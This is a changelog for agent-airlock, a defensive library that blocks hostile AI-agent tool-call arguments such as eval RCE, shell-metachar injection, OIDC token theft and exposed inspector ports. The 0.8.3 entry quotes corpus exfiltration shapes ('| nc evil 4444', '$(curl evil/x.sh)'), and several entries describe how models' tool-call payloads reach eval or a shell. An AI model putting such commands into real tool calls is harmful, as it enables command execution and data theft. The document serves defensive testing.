acquisition of Stainless (2026-05-13) and the HarnessAudit-Bench
paper (arXiv:2605.14271, 2026-05-14) — but **neither lands as a
runtime probe or benchmark reproduction**. The 2026-05-19 Product
Improvements doc proposed both as automatic surfaces; honest
reframing for the architecture:

- **Stainless probe → pure-function classifier.** agent-airlock's
  `@Airlock` decorator wraps a Python tool function; it does NOT
  intercept outbound HTTP. The "runtime probe inspects MCP server
  headers" framing assumed a proxy/sidecar surface we deliberately
  don't ship. Honest reframe: a `classify_sdk_lineage` pure function
  operators call from their own audit hooks.
- **HarnessAudit-Bench scoring → corpus schema extension.** The
  benchmark's artifacts are not public as of 2026-05-19. Authoring
  synthetic tasks and calling it "HarnessAudit-Bench scoring" would
  be the same overclaim pattern v0.8.2 caught with Metis. Honest
  reframe: adopt the paper's **two-category taxonomy**
  (`resource_access`, `info_transfer`) as a corpus schema extension
  so operators can load the benchmark's artifacts when published.

### ADD

- **`classify_sdk_lineage` pure-function classifier
  (`agent_airlock.sdk_provenance`).** Scans a User-Agent header and
  the first 4 KB of a response body for Stainless code-generator
  markers. Returns an `SDKLineageMatch` (frozen dataclass) with
  `lineage` (`STAINLESS` | `UNKNOWN`), `match_source`
  (`"user_agent"` | `"response_body"` | `None`), `matched_pattern`,
  and `detail`. Operators extend via `extra_ua_patterns` /
  `extra_body_markers` kwargs.

  Default markers:
  - UA substrings: `stainless`, `stainless-sdk`, `stainless-node`,
    `stainless-python`
  - Body banners: `auto-generated by Stainless`, `Generated by
    Stainless`, `@stainless-generated`, `stainless-codegen`

  Factory:
  `policy_presets.stainless_provenance_probe_defaults()` →
  `default_action="tag_only"` (visibility, not enforcement).

  Doc: `docs/policies/stainless-provenance-probe.md`.

  Tests: 20 cases in `tests/test_sdk_provenance.py` covering UA
  detection (lowercase, titlecase, substring), body detection,
  no-match, edge cases (empty, truncated body, case sensitivity),
  match-shape invariants, operator overrides, factory shape.

- **Corpus per-category coverage (`CategoryCount`).** The v0.8.2
  corpus regression now supports an optional `violation_category`
  field on `CorpusEntry`. `MetisInspiredCorpusBlockRateDecision`
  exposes a new `category_counts: tuple[CategoryCount, ...]` field
  with per-category total + blocked counts. The corpus schema is
  bumped to `schema_version: 2`; legacy v1 corpora load unchanged
  (the new field defaults to `None`, and uncategorised entries are
  excluded from `category_counts`).

  Default categories adopted from HarnessAudit-Bench (arXiv:2605.14271):
  `resource_access` and `info_transfer`. The packaged v0.8.2 corpus
  (`tests/cves/corpora/metis_inspired_corpus_2026_05_18.json`) is
  re-tagged: most entries are `resource_access`; three argv-metachar
  entries (`stdio-metachar-pipe`, `-dollar-paren`, `-double-amp`) are
  re-tagged `info_transfer` since `| nc evil 4444` / `$(curl evil/x.sh)` /
  `&& nc evil 4444` are exfiltration shapes; benign baselines remain
  `null`.

  `airlock corpus-bench`:
  - Text report adds a `by_category: ...` line when categories are
    present.
  - JSON report adds a `category_counts` array.
  - Markdown report adds a "Per-category coverage" table with a
    coverage percentage column.

### Surface additions (`__all__`)

- `classify_sdk_lineage`
- `SDKLineage`, `SDKLineageMatch`
- `DEFAULT_STAINLESS_UA_PATTERNS`, `DEFAULT_STAINLESS_BODY_MARKERS`
- `CategoryCount`
- `policy_presets.stainless_provenance_probe_defaults`

### Schema-version bump (additive)

The packaged corpus JSON moves from `schema_version: 1` to
`schema_version: 2`. The bump is **additive only** — the new
`violation_category` field is optional, and the CLI loader uses
`.get("violation_category")` so legacy v1 corpora load unchanged.

### Carry-over (unchanged from v0.8.2)

- v0.8.2: `MetisInspiredCorpusBlockRateGuard`, `airlock corpus-bench`
- v0.8.1: `OpenAPIDriftGuard`, `vaccinate_openapi`,
  `mcp_calc_server_bundle_defaults_2026_05_15`
- v0.8.0: `EvalRCEGuard`, `InspectorExposureGuard`,
  `AgentSDKCreditBudget`

---

## [0.8.2] - 2026-05-18 — "Metis-inspired corpus block-rate regression + airlock corpus-bench CLI"

Monday cut on top of v0.8.1. **Minor bump** — one new release-gate
primitive (`MetisInspiredCorpusBlockRateGuard`), one CLI subcommand
(`airlock corpus-bench`). No breaking changes.

### Honest framing up front

This release is *inspired by* the Metis paper (arXiv:2605.10067, ICML
2026) but does **not** reproduce its POMDP attacker. Metis measures
response-level Attack Success Rate (ASR) on a closed-loop LLM;
agent-airlock validates tool-call arguments and never sees the
model's response — the threat models do not compose. What we ship
instead is a **deterministic exploit-shape corpus** and a
**block-rate** (inverse of ASR) regression on the guard chain. The
Metis paper is cited as motivation for adopting a structured failure-
mode taxonomy as a release-gate input, not as a source of prompts.

### ADD

- **Metis-inspired corpus block-rate regression.** New runtime
  primitive `agent_airlock.regression_corpus.MetisInspiredCorpusBlockRateGuard`
  runs a fixed corpus of exploit-shape prompts through a guard chain
  (default: `EvalRCEGuard` + `StdioCommandInjectionGuard`), computes
  ``block_rate = blocked_count / total_prompts``, and denies the
  release gate when block rate drops below
  ``baseline_block_rate - drift_threshold`` (default threshold 5%).
  Rising block rate (a new guard catching more) is fine — the gate
  is one-sided downward.

  Corpus fixture: `tests/cves/corpora/metis_inspired_corpus_2026_05_18.json`,
  25 entries (17 exploit-shape + 8 benign), anchored to CVE-2026-44717
  eval-RCE class + 2026-05-05 STDIO command-injection class.

  Baseline locked at first run: **0.68** block rate (17/25). The
  benign entries serve as false-positive sentinels.

  Decision dataclass mirrors v0.7.x / v0.8.x family — `allowed: bool`
  for chain-friendly composition.

  Public surfaces:
    - `MetisInspiredCorpusBlockRateGuard`
    - `MetisInspiredCorpusBlockRateDecision`
    - `MetisInspiredCorpusBlockRateVerdict`
    - `CorpusEntry`, `CorpusPromptOutcome`
    - `policy_presets.metis_inspired_corpus_block_rate_regression_defaults_2026_05_18`

  Tests: 13 cases in `tests/test_regression_corpus.py` (math /
  decision shape / construction / custom chain) + 10 cases in
  `tests/cves/test_metis_inspired_corpus_2026_05_18.py` (fixture
  load, gate pass, eval-shape blocked, benign not blocked, lenient
  chain trips gate).

- **`airlock corpus-bench` CLI.** New `python -m
  agent_airlock.cli.corpus_bench` runs the corpus through the
  guard chain and emits a report. Flags:

  ```
  --corpus-path PATH      # required
  --report {text,json,md} # default: text
  --baseline FLOAT        # override fixture baseline
  --threshold FLOAT       # override fixture threshold
  ```

  Exit codes: `0` gate pass, `1` generic error, `2` argparse usage,
  `3` gate FAILED (block rate regressed). structlog output is
  routed to stderr so stdout stays clean for machine parsing.

  Tests: 7 cases in `tests/cli/test_corpus_bench.py`.

### NOTE — Suggestion 3 deferred

The 2026-05-18 Product Improvements doc proposed an interop preset
for the Microsoft Agent Governance Toolkit (launched 2026-04-02).
The doc itself tagged the proposal `[major-needs-decision]` and
deferred the prompt. v0.8.2 does not include it — the strategic
question is logged at `ROADMAP_2026.md#post-v082-strategic-question-2026-05-18`
for resolution before any code lands.

### Surface additions (`__all__`)

- `CorpusEntry`, `CorpusPromptOutcome`
- `MetisInspiredCorpusBlockRateDecision`
- `MetisInspiredCorpusBlockRateGuard`
- `MetisInspiredCorpusBlockRateVerdict`
- `policy_presets.metis_inspired_corpus_block_rate_regression_defaults_2026_05_18`

### Carry-over (unchanged from v0.8.1)

- `OpenAPIDriftGuard` / `OpenAPIDriftDecision` / `OpenAPIDriftVerdict` / `vaccinate_openapi` (Hermes 2026-05-13 paper anchor)
- `mcp_calc_server_bundle_defaults_2026_05_15` composition factory
- v0.8.0 surfaces: `EvalRCEGuard`, `InspectorExposureGuard`, `AgentSDKCreditBudget`

---

## [0.8.1] - 2026-05-17 — "OpenAPI Drift Guard (Hermes 2026-05-13 paper) + MCP Calc-Server bundle preset"

Sunday-evening cut on top of v0.8.0. **Minor bump** — one new public
primitive (`OpenAPIDriftGuard`), one composition factory for the
existing CVE-2026-44717 surface. No breaking changes.

### ADD

- **OpenAPI Drift Guard (Hermes paper anchor).** The Hermes paper
  ([arXiv:2605.14312](https://arxiv.org/abs/2605.14312), 2026-05-13)
  measured production OpenAPI-driven agent failures and found that
  the dominant failure mode is **payload-shape drift**: missing
  required fields, invented fields, type mismatches. The agent
  emits a request body that violates the published schema; the
  downstream service either rejects it (retry loop) or, worse,
  dispatches on the malformed payload.

  v0.8.1 ships `agent_airlock.mcp_spec.openapi_drift_guard.OpenAPIDriftGuard`
  as the runtime gate one layer above the v0.7.x / v0.8.0 exploit-shape
  guards. Three drift modes:

  | Mode | Behaviour on drift |
  |---|---|
  | `strict` (default) | `allowed=False`, verdict `DENY_DRIFT` |
  | `warn` | `allowed=True`, verdict `ALLOW_WARN`, structured log |
  | `shadow` | `allowed=True`, verdict `ALLOW_SHADOW`, no log |

  Per the 2026-05-17 operator decision, the caller supplies the
  spec as a parsed dict — agent-airlock does not import PyYAML or
  any spec-loader. Three divergence categories detected:
  `missing_required`, `unknown_field` (when `additionalProperties:
  false`), `type_mismatch` (incl. Python `bool` not accepted as
  JSON `integer`).

  Companion `vaccinate_openapi(spec, drift_mode=...)` decorator
  factory wraps a tool function and raises `OpenAPIDriftViolation`
  on a deny decision.

  Decision dataclass mirrors the v0.7.x / v0.8.0 family —
  `allowed: bool` for chain-friendly composition.

  Factory: `policy_presets.openapi_doc_drift_guard_defaults(spec,
  drift_mode="strict")`.

  Doc: `docs/policies/openapi-drift-guard.md`.

- **MCP Calc-Server bundle preset (CVE-2026-44717 composition).**
  `policy_presets.mcp_calc_server_bundle_defaults_2026_05_15()` is
  a **composition factory** that wires v0.8.0's `EvalRCEGuard` and
  v0.7.6's `StdioCommandInjectionGuard` under a single preset_id
  namespace (`mcp_calc_server_bundle_2026_05_15`) scoped to a
  curated calc-server tool-name pattern set (`calc`, `calculate`,
  `evaluate`, `sympy_eval`, `math_eval`).

  **Honest scope:** this preset does NOT introduce a new runtime
  detector. The eval-sink and shell-metachar detection ship in
  v0.8.0 / v0.7.6. The bundle gives security teams cataloguing
  CVE-2026-44717 coverage one row to point to and a `composes`
  field naming both underlying guards.

  Operators wanting bare-eval detection on every tool regardless
  of name should keep using
  `stdio_guard_eval_defaults_2026_05_15()` directly. The bundle
  is the per-tool-class projection.

### Tests

- `tests/mcp_spec/test_openapi_drift_guard.py` — 21 cases covering
  clean payload, missing required, unknown field, type mismatch
  (including bool-vs-integer), unknown operation, drift modes,
  construction validation, decision-shape invariants, and
  `vaccinate_openapi` round-trips.
- `tests/test_mcp_calc_server_bundle_preset.py` — 12 cases covering
  factory shape, `composes` field enumeration, override
  propagation, and construction validation.

### Surface additions (`__all__`)

- `OpenAPIDivergence`
- `OpenAPIDivergenceKind`
- `OpenAPIDriftDecision`
- `OpenAPIDriftGuard`
- `OpenAPIDriftVerdict`
- `OpenAPIDriftViolation`
- `vaccinate_openapi`
- `policy_presets.openapi_doc_drift_guard_defaults`
- `policy_presets.mcp_calc_server_bundle_defaults_2026_05_15`

### Carry-over (unchanged from v0.8.0)

- `EvalRCEGuard` / `EvalRCEDecision` / `EvalRCEVerdict` (CVE-2026-44717)
- `InspectorExposureGuard` / `InspectorExposureDecision` / `InspectorExposureVerdict` (CVE-2026-23744 runtime)
- `AgentSDKCreditBudget` / `AgentSDKCreditDecision` / `AgentSDKCreditVerdict` (Anthropic 2026-06-15 billing split)

---

## [0.8.0] - 2026-05-17 — "Eval-RCE (CVE-2026-44717) + MCP Inspector runtime scan (CVE-2026-23744) + Agent SDK Credit pool budget"

Sunday cut. **Minor bump** — three additive ADD rows, two CVE-anchored
guards plus a new public budget primitive. No breaking changes.

### ADD

- **Eval-RCE guard (CVE-2026-44717).** NVD 2026-05-15: MCP Calculate
  Server < 0.1.1 used `eval()` to evaluate user math expressions
  without input sanitization (RCE; patched in 0.1.1 by pinning
  `local_dict`). The exploit class is **not MCP-Calculate-specific** —
  any tool reaching `eval()` / `exec()` / `compile()` /
  `__import__()` / `getattr()` / `sympy.parsing.sympy_parser.parse_expr()`
  with a model-derived string is vulnerable. New module
  `src/agent_airlock/mcp_spec/eval_rce_guard.py` ships
  `EvalRCEGuard.evaluate(args) -> EvalRCEDecision`. Detects bare-eval
  invocations on any string-valued field (word-boundary regex avoids
  false-positives on substrings like `'Eval Industries'`). Includes a
  curated vulnerable-package denylist (`mcp-calculate-server`
  `0.0.8`/`0.0.9`/`0.1.0`) and a `parse_expr` safe-form exemption
  (`local_dict=` / `global_dict=` pinning is the upstream patch).
  Companion factory:
  `policy_presets.stdio_guard_eval_defaults_2026_05_15()`. Tests:
  `tests/mcp_spec/test_eval_rce_guard.py` (21 cases). Doc:
  `docs/policies/eval-rce-cve-2026-44717.md`. Complementary to v0.7.5
  `FilterEvalRCEGuard` (lambda / Expression.Lambda syntax shapes).

- **MCP Inspector exposure guard (CVE-2026-23744 runtime extension).**
  v0.5.x ships `bind_address_guard.py` for the config-time check
  (operator-supplied bind address is `0.0.0.0`); this is the runtime
  complement that scans the process's actual LISTEN sockets via
  stdlib `/proc/net/tcp`. New module
  `src/agent_airlock/mcp_spec/inspector_exposure_guard.py` ships
  `InspectorExposureGuard.scan_listeners() -> InspectorExposureDecision`.
  Detects IPv4 `0.0.0.0` binds on the MCPJam inspector port range
  (6274–6277). Operator opt-out via `MCP_INSPECTOR_REQUIRE_AUTH=1`.
  **Linux-only** — fails-open on macOS / Windows with a dedicated
  `UNKNOWN_PLATFORM_UNSUPPORTED` verdict so CI matrix runs on
  non-Linux don't red-flag a Linux-only path. Companion factory:
  `policy_presets.mcp_inspector_exposure_guard_defaults()`. Tests:
  `tests/mcp_spec/test_inspector_exposure_guard.py` (11 cases, all
  using stdlib `/proc/net/tcp` fixture files — no live socket
  dependency). Doc:
  `docs/policies/mcp-inspector-exposure-guard.md`.

- **Agent SDK Credit pool budget primitive.** Anthropic's 2026-06-15
  billing split (Zed blog 2026-05-14) decouples Claude subscriptions
  from Claude Code usage when routed through tools like Zed / Agent
  SDK, with per-month credit pools ($20 Pro / $100 Max 5x / $200
  Max 20x). New module `src/agent_airlock/budget/agent_sdk_credit.py`
  ships `AgentSDKCreditBudget(monthly_credit_usd, tier_label=None)`
  with `register_call(model, input_tokens, output_tokens) ->
  AgentSDKCreditDecision`. 90% `NEAR_LIMIT` (still
  `allowed=True` — operator policy may convert), 100% `EXHAUSTED`
  (`allowed=False`). Packaged pricing table
  `data/anthropic_pricing_2026_06.json` covers Opus 4.6/4.7,
  Sonnet 4.6, Haiku 4.5. Unknown models fail-closed
  (`ValueError`). Tests:
  `tests/budget/test_agent_sdk_credit.py` (11 cases). Doc:
  `docs/budget/agent-sdk-credit.md`.

### Public-surface additions (semver-minor — new namespace + new symbols)

```python
from agent_airlock import (
    # Eval-RCE (CVE-2026-44717)
    DEFAULT_EVAL_SINKS, DEFAULT_VULNERABLE_PACKAGES,
    EvalRCEDecision, EvalRCEGuard, EvalRCEVerdict,
    # MCP Inspector exposure (CVE-2026-23744 runtime)
    DEFAULT_INSPECTOR_PORTS,
    InspectorExposureDecision, InspectorExposureGuard, InspectorExposureVerdict,
    # Agent SDK Credit pool budget
    AGENT_SDK_TIER_USD,
    AgentSDKCreditBudget, AgentSDKCreditDecision, AgentSDKCreditVerdict,
    load_anthropic_pricing_2026_06,
)
from agent_airlock.policy_presets import (
    stdio_guard_eval_defaults_2026_05_15,
    mcp_inspector_exposure_guard_defaults,
)
```

### Tests + coverage

- 21 new cases for `EvalRCEGuard`
- 11 new cases for `InspectorExposureGuard`
- 11 new cases for `AgentSDKCreditBudget`
- Net: **2,329 → 2,372** tests (+43); coverage above the 82% CI floor.

### TDD

Strict red-green-refactor for all three: 43 tests written first,
watched fail with `ModuleNotFoundError`, then minimal implementations,
then watched all 43 pass.

### Honest scope

- All three guards are heuristic / data-driven (regex shapes,
  curated denylists, runtime listener scans). They catch the
  disclosed CVE classes and obvious obfuscation variants, but they
  are **not** complete static analyzers.
- `EvalRCEGuard` vulnerable-package denylist is curated. Operators
  keep it current as new CVEs in the class drop.
- `InspectorExposureGuard` is Linux-only (stdlib `/proc/net/tcp`).
  Non-Linux platforms fail-open. Operators on macOS / Windows who
  want a runtime check should layer their own psutil-based scan.
- `AgentSDKCreditBudget` is in-process only. Cross-process /
  cross-restart persistence is out of scope; operators layer their
  own sink (Redis / file / DB) if needed.
- The 2026-06 pricing table is a snapshot. Operators on enterprise
  / annual contracts override via the `override_pricing=` kwarg.
- The 0.2.x Claude Agent SDK forward bump (Opus 4.7 ≥0.2.111)
  still carries — separate Sunday-review candidate.

### Primary sources

- https://nvd.nist.gov/vuln/detail/CVE-2026-44717 (2026-05-15)
- https://github.com/boroeurnprach/CVE-2026-23744-PoC
- https://zed.dev/blog/anthropic-subscription-changes (2026-05-14)

---

## [0.7.6] - 2026-05-12 — "OIDC publish-window guard (TanStack 2026-05-11) + MCP STDIO command-injection guard (Snyk ToxicSkills 2026-05-05)"

Tuesday daily cut. Minor bump — two ADD rows, both structurally pure
(no SDK imports). **No breaking changes.** Operator-parallel to a
mannsetu DAY 6 SEV-1 hotfix; both guards are regex/string-set match
over tool-call args.

### ADD

- **OIDC publish-window guard (TanStack postmortem 2026-05-11).**
  An attacker extracted the GitHub Actions runner's OIDC token from
  `/proc/<pid>/maps` and `/proc/<pid>/mem` of the Runner.Worker
  process and used it to republish 42 packages × 84 versions
  outside the workflow's own publish step. The npm trusted-publisher
  binding has no per-publish review — once configured, any code path
  in the workflow can mint a publish-capable token. New module
  `src/agent_airlock/mcp_spec/oidc_publish_window_guard.py` ships
  `OIDCPublishWindowGuard.evaluate(args) -> OIDCPublishWindowDecision`.
  Detects: `(package, version)` arg pair on the operator-supplied
  blast list, OR npm-registry tarball URLs
  (`https://registry.npmjs.org/<pkg>/-/...-<ver>.tgz`) targeting any
  pair. Ships with a curated 2026-05-11 fixture
  (`data/oidc_publish_blast_2026_05_11.json`, 89 entries: 84 TanStack
  npm packages + 5 cross-ecosystem entries per Aikido 2026-05-11)
  loadable via `load_blast_list_from_2026_05_11()`. Companion factory
  `policy_presets.npm_oidc_publish_window_guard_defaults()` returns
  the recommended config dict — parity with v0.7.5's
  `semantic_kernel_filter_eval_rce_2026_25592_26030_defaults`. 13
  regression tests. Doc:
  `docs/policies/npm-oidc-publish-window-guard.md`.

- **MCP STDIO command-injection guard (carried from 2026-05-11
  prompt).** Snyk ToxicSkills disclosed via Help Net Security
  2026-05-05: "1 in 4 MCP servers opens AI agent security to code
  execution risk." MCP STDIO transport accepts an argv vector that
  often arrives via the model's tool-call payload — a shell metachar
  opens an injection path. New module
  `src/agent_airlock/mcp_spec/stdio_command_injection_guard.py`
  ships `StdioCommandInjectionGuard.evaluate(args) ->
  StdioCommandInjectionDecision`. Denies on default shell metachar
  set (`;`, `&&`, `||`, `|`, newline, CR, backtick, `$(`) in any
  argv element. **Opt-in** path-traversal check via
  `cwd_allowlist=(...)` — empty allowlist (default) disables it so
  operators who don't route through a fixed cwd see no false
  positives. Operators can extend the metachar set via
  `extra_metachars`. Companion factory
  `policy_presets.mcp_stdio_command_injection_preset_defaults()`.
  18 regression tests (incl. 7 parametrised metachar variants +
  inside/outside-allowlist + extension). Doc:
  `docs/policies/mcp-stdio-command-injection-guard.md`.

### Public-surface additions (semver-minor — additive new symbols)

```python
from agent_airlock import (
    # OIDC publish-window (TanStack 2026-05-11)
    OIDCPublishWindowDecision,
    OIDCPublishWindowGuard,
    OIDCPublishWindowVerdict,
    load_blast_list_from_2026_05_11,
    # MCP STDIO command-injection (HelpNetSecurity 2026-05-05)
    DEFAULT_SHELL_METACHARS,
    StdioCommandInjectionDecision,
    StdioCommandInjectionGuard,
    StdioCommandInjectionVerdict,
)
from agent_airlock.policy_presets import (
    npm_oidc_publish_window_guard_defaults,
    mcp_stdio_command_injection_preset_defaults,
)
```

### Tests

- 13 new cases in `tests/mcp_spec/test_oidc_publish_window_guard.py`
- 18 new cases in `tests/mcp_spec/test_stdio_command_injection_guard.py`
- Net: **2,298 → 2,329** tests; coverage above the 82% CI floor.

### TDD

Strict red-green-refactor for both ADDs: tests written first, watched
fail with `ModuleNotFoundError`, then minimal implementations, then
watched all pass. No production code without a failing test first.

### Honest scope

- The OIDC blast-list guard is a **known-bad denier**, not a generic
  OIDC anomaly detector. Architectural fix is npm's per-publish-
  review (postmortem "Remediation Guidance"); the runtime side is
  this guard.
- The 2026-05-11 fixture is a point-in-time snapshot. Operators
  regenerate the JSON when new blast-list extensions are confirmed.
  Sunday weekly-review surfaces this as a checklist item.
- The STDIO traversal check is opt-in (empty `cwd_allowlist`
  disables it) so operators who don't route through a fixed cwd see
  no false positives.
- 0.2.x Claude Agent SDK forward bump (Opus 4.7 ≥0.2.111) still NOT
  in scope — carries to next Sunday's weekly review per v0.7.3's
  "Honest scope".

### Primary sources

- https://tanstack.com/blog/npm-supply-chain-compromise-postmortem (2026-05-11) — ADD-1 anchor
- https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised (2026-05-11) — ADD-1 cross-ecosystem
- https://www.helpnetsecurity.com/2026/05/05/ai-agent-security-skills-blind-spots/ (2026-05-05) — ADD-2 anchor

---

## [0.7.5] - 2026-05-10 — "Filter-Eval RCE guard (CVE-2026-25592 + CVE-2026-26030)"

Sunday daily cut. Minor bump — single ADD row introducing four new
public surfaces. **No breaking changes.** Operator-parallel to a
LIFE-SAFETY DAY 4 SEV-1 hotfix on a sibling repo (mannsetu); ADD-1 is
structurally pure (regex-only, no SDK import, no shared registrar
admin path).

### ADD

- **Filter-Eval RCE guard.** Microsoft's 2026-05-07 MSRC blog
  ["When prompts become shells: RCE vulnerabilities in AI agent frameworks"][msrc]
  disclosed two CVEs in the Semantic Kernel filter-evaluation
  pipeline: **CVE-2026-25592** (Python lambda-filter eval RCE) and
  **CVE-2026-26030** (C# template-expression eval RCE). The exploit
  class is **not Semantic-Kernel-specific** — any agent framework
  that compiles user-controlled filter expressions is vulnerable.
  New module `src/agent_airlock/mcp_spec/filter_eval_rce_guard.py`
  ships `FilterEvalRCEGuard.evaluate(args)` returning a frozen
  `FilterEvalRCEDecision` with `allowed: bool` (mirrors
  `AllowlistVerdict` and `OutcomesRubricDecision` for chain-friendly
  composition). Detection is regex-based on a default vocabulary of
  suspect fields (`filter`, `condition`, `predicate`, `template`,
  `expression`, `where`, `lambda`) — operators on a non-default
  vocabulary can override; the most defensive mode is
  `scan_all_fields=True`. The guard is a **syntax-shape detector**:
  it catches the disclosed CVE payload class and the obvious
  obfuscation variants (multi-line, leading whitespace) without
  evaluating the expression itself. No `semantic-kernel` dep.
  Companion preset:
  `policy_presets.semantic_kernel_filter_eval_rce_2026_25592_26030_defaults()`
  returns the recommended config dict — parity with
  `mcp_config_path_traversal_cve_2026_31402`. Tests:
  `tests/mcp_spec/test_filter_eval_rce_guard.py` (19 cases). Doc:
  `docs/policies/semantic-kernel-filter-eval-rce.md`.

[msrc]: https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/

### Public-surface additions (semver-minor — additive new symbols)

```python
from agent_airlock import (
    FILTER_EVAL_RCE_DEFAULT_SUSPECT_FIELDS,
    FilterEvalRCEDecision,
    FilterEvalRCEGuard,
    FilterEvalRCEVerdict,
)
from agent_airlock.policy_presets import (
    semantic_kernel_filter_eval_rce_2026_25592_26030_defaults,
)
```

### Tests

- 19 new cases in `tests/mcp_spec/test_filter_eval_rce_guard.py`:
  - CVE-2026-25592 Python lambda in `filter` field
  - lambda in `condition` field
  - CVE-2026-26030 C# `Expression.Lambda<>` in `template`
  - Mustache-style template-eval token
  - benign equality filter NOT denied (no false positives)
  - benign field with the substring "Lambda" in a string value NOT denied
  - missing filter fields / `None` args → ALLOW
  - multi-line lambda injection denied
  - leading-whitespace lambda denied
  - `scan_all_fields=True` catches lambdas in unknown fields
  - default mode preserves the suspect-field allowlist
  - custom suspect-fields (positive + negative)
  - construction-time rejection (non-frozenset, non-string member)
  - factory shape, `scan_all_fields` override, `suspect_fields` override
- Net: **2,279 → 2,298** tests; coverage stays above the 82% CI floor.

### Honest scope

- The guard is a regex heuristic. It catches the disclosed CVE
  payload class and the obvious obfuscation variants. A determined
  attacker who controls the field name can hide the lambda outside
  the default vocabulary — `scan_all_fields=True` is the
  operator-defensive remedy.
- The full Semantic Kernel adapter trio (lib + tests + docs) is
  scoped as an M-effort future-day row, not today. Today's ship is
  the policy preset; the adapter trio is the follow-up.
- The 0.2.x Claude Agent SDK forward bump (Opus 4.7 ≥0.2.111)
  carries to next Sunday's weekly review per v0.7.3's "Honest
  scope" — still NOT in scope here.

---

## [0.7.4] - 2026-05-09 — "Managed Agents Outcomes-rubric guard (2026-05-06 anchor)"

Saturday daily cut. Minor bump — single ADD row introducing four new
public surfaces. **No breaking changes.** Operator-parallel to a
LIFE-SAFETY DAY 3 SEV-1 hotfix on a sibling repo (mannsetu); ADD-1 is
structurally pure (no SDK import, no shared registrar admin path).

### ADD

- **Managed Agents Outcomes-rubric guard.** Anthropic's 2026-05-06 SF
  Code event shipped Managed Agents with a structured **Outcomes**
  rubric (beta) — a rubric run produces a verdict identifier that
  downstream tool calls should carry as a provenance anchor. New
  module `src/agent_airlock/integrations/managed_agents_outcomes_guard.py`
  ships `ManagedAgentsOutcomesGuard.evaluate(provenance)` returning a
  frozen `OutcomesRubricDecision` with `allowed: bool` (mirrors
  `AllowlistVerdict` for chain-friendly composition). Default
  `allowlist=frozenset()` denies all calls — operators must explicitly
  enrol the rubric IDs they trust. The provenance field name is
  operator-overridable. The guard is **not** an Anthropic SDK
  consumer — frozenset[str] lookup, no install cost.
  Companion preset: `policy_presets.managed_agents_outcomes_2026_05_06_defaults()`
  returns the recommended config dict. Tests:
  `tests/integrations/test_managed_agents_outcomes_guard.py` (15 cases incl.
  custom-field override + composability proof + bad-allowlist
  construction-time rejection). Doc:
  `docs/policies/managed-agents-outcomes-2026-05-06.md`.
  Primary sources:
    - https://platform.claude.com/docs/en/managed-agents/dreams (2026-05-06)
    - https://code.claude.com/docs/en/routines (2026-05-06)

### Public-surface additions (semver-minor — additive new symbols)

```python
from agent_airlock import (
    MANAGED_AGENTS_OUTCOMES_2026_05_06_DEFAULT_FIELD,
    ManagedAgentsOutcomesGuard,
    OutcomesRubricDecision,
    OutcomesRubricVerdict,
)
from agent_airlock.policy_presets import managed_agents_outcomes_2026_05_06_defaults
```

### Tests

- 15 new cases in `tests/integrations/test_managed_agents_outcomes_guard.py`:
  deny-all default; allowlisted permit; mismatched rubric deny; absent
  provenance / absent key / empty-string ID / non-string ID; custom
  field name (positive + negative); composability with
  `manifest_only_allowlist.AllowlistVerdict`; bad-allowlist
  construction rejection (non-frozenset, non-string member); preset
  factory shape, default empty allowlist, provenance-field override.
- Net: **2,264 → 2,279** tests; coverage stays above the 82% CI floor.

### Honest scope

- Anthropic's Managed Agents and Outcomes are **beta**. The rubric
  ID format and the field name carrying the anchor in tool-call
  payloads may shift between today (2026-05-06 anchor) and Q3 2026
  GA. The allowlist is a frozenset of strings (no regex), and the
  field name is operator-overridable.
- **Dreaming** memory-curation payloads (the 2026-05-06 research
  preview) are out-of-scope for this guard. Sunday 2026-05-10
  weekly-review candidate for a separate preset.
- The 0.2.x Claude Agent SDK forward bump (Opus 4.7 requires Agent
  SDK ≥0.2.111) carries to Sunday's weekly review per v0.7.3's
  explicit "Honest scope" — still NOT in scope here.

---

## [0.7.3] - 2026-05-06 — "Claude Agent SDK floor bump 0.1.58 → 0.1.73 + PostToolUse duration_ms hook regression"

Wednesday daily cut. Patch bump — single UPDATE row. Closes the
2-day operator-flagged TODO inside `anthropic_claude_agent_sdk.py`
("Update this tuple when a new version has been verified") and
forwards the SDK 0.1.73 `duration_ms` PostToolUse hook field into
the audit-receipt body.

### UPDATE

- **Claude Agent SDK supported-version tuple bumped 0.1.58 → 0.1.58, 0.1.73.**
  `SUPPORTED_SDK_VERSIONS` now lists both pins; the floor stays at
  0.1.58 for backward compatibility with the v0.6.1-shipped trio.
  `[claude-agent]` extra cap widened from `>=0.1.58` to
  `>=0.1.58,<0.2.0` — the 0.2.x line (Opus 4.7 requires Agent SDK
  >=0.2.111) is intentionally out of scope for this floor and is a
  separate forward-bump candidate.

- **`posttooluse_audit_payload(hook_input)` helper.** New function
  that maps a Claude Agent SDK PostToolUse hook input to an Airlock
  audit-receipt body. SDK v0.1.73 (released 2026-05-04) added
  `duration_ms` (tool execution time, excluding permission prompts
  and PreToolUse hooks); the helper forwards the field when present
  and remains backward-compatible with 0.1.58 payloads where it's
  absent. The body carries an explicit
  `sdk_field_durations_present` boolean so downstream observability
  can distinguish "0.1.58 payload" from "0.1.73 payload that
  happened to be 0ms".

### Tests

- 3 new regression cases in
  `tests/integrations/test_anthropic_claude_agent_sdk.py`:
  - `duration_ms` propagates when SDK supplies it (0.1.73+ payload)
  - `duration_ms` omitted for older 0.1.58 payloads (no synthesis)
  - 0ms duration is preserved distinctly from absent
    (regression against future conflation bugs)
- Existing `test_pyproject_pins_extra_at_minimum_version` updated
  to assert the new `>=0.1.58,<0.2.0` cap.

### Public-surface additions (semver-patch — additive)

```python
from agent_airlock.integrations.anthropic_claude_agent_sdk import (
    posttooluse_audit_payload,  # NEW
)
```

No top-level re-export — the helper is opt-in at the integrations
namespace, mirroring how `memory_helpers()` already lives.

### Honest scope

- The 0.2.x SDK line is **not** in scope today. Operators wanting
  Opus 4.7 hosted-Claude-Code support will need a separate forward
  bump (Sunday 2026-05-10 review candidate).
- No README claim regression bump (UPDATE-1 doesn't move the 11+2
  adapter/example split).

### Primary sources

- https://pypi.org/project/claude-agent-sdk/ — v0.1.73 (2026-05-04)
- https://releasebot.io/updates/anthropic — Anthropic May 2026
  release notes ("PostToolUse and PostToolUseFailure hook inputs
  now include `duration_ms`")

---

## [0.7.2] - 2026-05-05 — "CrewAI canonical-leg trio (closes #5)"

Tuesday daily cut. Patch bump — single additive ADD row. Closes the
longest-open backlog issue (#5, opened 2026-03-14) by promoting
